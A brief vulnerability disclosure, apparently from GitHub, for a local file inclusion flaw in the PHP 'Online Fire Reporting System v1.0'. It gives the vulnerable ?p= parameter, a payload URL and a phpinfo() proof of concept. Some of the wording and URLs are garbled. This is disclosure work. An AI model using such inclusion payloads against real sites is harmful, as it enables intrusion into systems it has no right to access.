# Online Fire Reporting System v1.0 by oretnom23 has The local file contains

vendor: https://www.sourcecodester.com/php/15346/online-fire-reporting-system-phpoop-free-source-code.html

Vulnerability File: ip/ofrs/?p=shell

Vulnerability location: ip/ofrs/?p=, p

Payload: ip/ofrs/?p=shell

![image](https://user-images.githubusercontent.com/54017627/170816433-6fbef929-d44d-4fd0-9d7d-2c4f6d838342.png)

We create a shell.php under the PHP file of the root of the website, which reads "<? phpinfo ();? > "

![image](https://user-images.githubusercontent.com/54017627/170479151-b4aabc1a-fdbd-45d2-8f5a-248d37092584.png)

And visit http://ip/ofrs/?p=,p You can see that phpinfo has been successfully included

![image](https://user-images.githubusercontent.com/54017627/170816416-0d91e581-109f-4b34-9363-3c0165765890.png)
